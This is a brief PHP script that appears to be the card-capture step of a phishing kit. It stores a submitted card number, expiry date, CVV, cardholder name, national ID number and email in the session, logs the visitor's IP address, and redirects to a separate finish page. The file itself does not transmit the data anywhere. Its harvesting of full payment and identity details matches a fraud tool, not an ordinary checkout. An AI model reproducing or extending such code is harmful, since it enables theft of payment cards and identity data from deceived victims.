<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$_SESSION['card'] = $_POST['card'];
$_SESSION['venc'] = $_POST['venc'];
$_SESSION['cvv'] = $_POST['cvv'];
$_SESSION['name'] = $_POST['name'];
$_SESSION['dni'] = $_POST['dni'];
$_SESSION['email'] = $_POST['email'];

header("Location: finish.php?ip=$ip");
?>